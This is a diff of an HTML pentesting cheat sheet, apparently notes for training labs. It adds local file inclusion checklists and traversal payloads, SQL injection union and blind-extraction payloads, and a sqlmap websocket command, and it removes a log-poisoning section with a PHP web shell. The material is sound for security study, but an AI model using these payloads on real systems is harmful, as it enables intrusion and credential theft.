@@ -95,7 +95,28 @@ gobuster vhost -u http://inlanefreight.htb:53137 -w /usr/share/seclists/Discover
 
                         <h2 id="LFI: Local File Inclusion">LFI: Local File Inclusion</h2>
                         <ul>
-                            <h3>Basic path traversal payloads</h3><pre><code class="language-url">http://.../index.php?language=../../../../etc/passwd
+                            <h3>Checklist once you found a file inclusion</h3>
+                            <ul>
+                                <li>Check for files of the website you are pentesting. For example .php files which could lead you to credentials or configuration files </li>
+                                
+                                <li></b>Check for local files</b> Some examples are:</li>
+                                <pre><code class="language-url">/etc/passwd   |   /etc/shadow   |  C:\Windows\System32\drivers\etc\hosts</code></pre>     
+                                
+                                <li>Check for configuration files</li>
+                                <pre><code class="language-url">.env | config.php </code></pre>  
+
+                                <li>Check for nginx or apache configuration files</li>
+                                <pre><code class="language-url">/etc/nginx/sites-enabled/default #nginx   |   /etc/apache2/sites-available/000-default.conf #apache  |  /etc/apache2/sites-enabled/000-default.conf   #apache </code></pre>     
+                                
+                                <li>Check for .ssh of local users using the users previously found in /etc/passwd</li>
+                                <pre><code class="language-url">/home/user/.ssh/id_rsa</code></pre>     
+                                
+                                <li>Check for log poisoning. <a class="notion-link" href="#Log Poisoning"> here</a> have documentation of it</li>
+                                <li>Check for DNS configuration files. <a class="notion-link" href="dns.html">Here</a> you have documentation of how to exploit it</li>
+                            </ul>
+
+                            <h3>Basic path traversal payloads</h3>
+                            <pre><code class="language-url">http://.../index.php?language=../../../../etc/passwd
 http://.../index.php?language=/../../../../etc/passwd
 http://.../index.php?language=....//....//....//....//etc/passwd
 http://.../index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
@@ -134,7 +155,8 @@ http://...index.php?language=/etc/passwd%00.php</code></pre>
                         <h2 id="SQL injection">SQL injection</h2>
                         <ul>
                             <p> Basic payloads</p>
-                            <pre><code class="language-sql">'+OR+1=1--
+                            <pre><code class="language-sql">1 OR 1=1
+'+OR+1=1--
 ' OR 1=1; --
 ' OR '1'='1
 " OR "1"="1" --
@@ -149,7 +171,7 @@ http://...index.php?language=/etc/passwd%00.php</code></pre>
                         </a>
                     </div> 
 
-                    <h3 style="color: red;">After attempting to trying payloads like a cracy monkey... Please try to reproduce which type of SQL query can be using the backed in order to display the data</h3>
+                    <h3 style="color: red;">After attempting to trying payloads like a crazy monkey... Please try to reproduce which type of SQL query can be using the backed in order to display the data</h3>
                     
                     <h3> Situationship example</h3>
                     <ul>
@@ -165,6 +187,7 @@ test'--</code></pre>
                     <h3>Union select payloads</h3>
                     <ul>
                         <p>After everything remember that all this payloads have variants</p>
+                        <b style="color: red;">Always start by 1 and go in crescendo</b>
                         <pre><code class="language-sql">cn') UNION ...
 cn' UNION select 1,2,3,4 --
 cn' UNION select 1,2,3,4 -- -
@@ -217,6 +240,14 @@ cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.C
                         </ul>
                     </ul>
 
+                    <h3>Limiting results</h3>
+                    <ul>
+                        <p>In the SQL injection output is being limited since it is being placed in just a single field in the website we could limit our result to show only one </p>
+                        <pre><code class="language-sql">cn' UNION select table_name from INFORMATION_SCHEMA.TABLES limit 0,1 --</code></pre> 
+                        <pre><code class="language-sql">cn' UNION select table_name from INFORMATION_SCHEMA.TABLES limit 1,1 --</code></pre>
+                        <pre><code class="language-sql">cn' UNION select table_name from INFORMATION_SCHEMA.TABLES limit 2,1 --</code></pre>   
+                    </ul>
+
                     <h3>Reading local files</h3>
                     <ul>
                         <p>Checking permissions</p>
@@ -235,20 +266,23 @@ cn' UNION SELECT 1,variable_name,variable_value,5 FROM information_schema.global
                     </ul>    
                     <h3> Blind SQL injection </h3>
                     <ul>
-                    Rememer to intercept the requests since in this case the injection has been made in the cookie.
-                    In this case it has been detected that if the query was valid a string was displayed on the screen.
-                    To check if a table exists we can use the following command
+                    <p>Rememer to intercept the requests since in this case the injection has been made in the cookie. In this case it has been detected that if the query was valid a string was displayed on the screen. To check if a table exists we can use the following command</p>
                     <pre><code class="language-sql">' AND (SELECT 'a' FROM users LIMIT 1)='a</code></pre>
                     We used the following query to check letter by letter the password
                     <pre><code class="language-sql">' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a</code></pre>
                     </ul>
 
-                    <h3> Situations</h3>
+                    <h3> SQLi with WebSockets</h3>
                     <ul>
-                        It is possible that to determine which parameter is injectable within the union we have to
-                        insert text in any of them trying the following way. If we can make it not jump
-                        no error would mean that this parameter is injectable   
-                        <pre><code class="language-sql">'+UNION+SELECT+NULL+'text'--</code></pre>
+                        <p>It could be possible that you found yourself in front of a website that uses websockets to verify it's resuls. In order to perform an SQL injection we must fulfill the following:</p>
+                        <p>Identify the endpoint of the websocket. This normally can be found in the code of the website. For example</p>
+                        <pre><code class="language-bash">ws://soc-player.soccer.htb:9091/</code></pre>
+                        <p>Now identify in which format dat is being transmitted. BurpSuite's <b>Websocket history</b> is so great to identify this. For example</p>
+                        <pre><code class="language-bash">{"id":"12345"}</code></pre>
+                        <p>With all of that we could create our own script ot perform the injection or we can use sqlmap to make our enumeration easier. Example of command</p>
+                        <pre><code class="language-bash">sqlmap -u "ws://soc-player.soccer.htb:9091/" --data '{"id": "*"}' --risk 3 --level 5</code></pre>
+                        <p><b>As always is hightly recommended to test the injection after using sqlmap so we can identify the technique which then can be specified in sqlmap command (technique=B)</b></p>
+                        <p>Other techniques can be used like creating a python script to perform the fuzzing of the chars (in case it's blind) or even a JS script that can be run from the browser to perform the fuzzing</p>
                     </ul>    
                 </ul>
                     
@@ -963,16 +997,6 @@ file`whoami`.jpg</code></pre>
                                     <pre><code class="language-url">http://10.10.10.1:8080/index.php?language=/var/log/apache2/access.log?cmd=id</code></pre>
                                 </ul>
 
-                                <h3>Server log Poisoning</h3>
-                                <ul>
-                                    <p>In this case we must check if we are able to view the logs using a file inclusion.</p>
-                                    <p>Apache logs are normally located at <b>/var/log/apache2/access.log, error.log  (Linux)</b> and <b>C:\xampp\apache\logs\ (Windows)</b></p>
-                                    <p>Nginx logs are normally located at <b>/var/log/nginx/ (Linux)</b> and <b>C:\nginx\log\</b></p>
-                                    <p>In case you are able to read any of them you'll figure out that the User-Agent is also stored there, which is a parameter that we can control</p>
-                                    <p>So you'll need to intercept the request and introduce any php code &lt;?php system($_GET['cmd']) ?&gt;</p>
-                                    <p>Then send the request </p>
-                                    <pre><code class="language-url">http://10.10.10.1:8080/index.php?language=/var/log/apache2/access.log?cmd=id</code></pre>
-                                </ul>
                             </ul>
                     </div>
                 </ul>
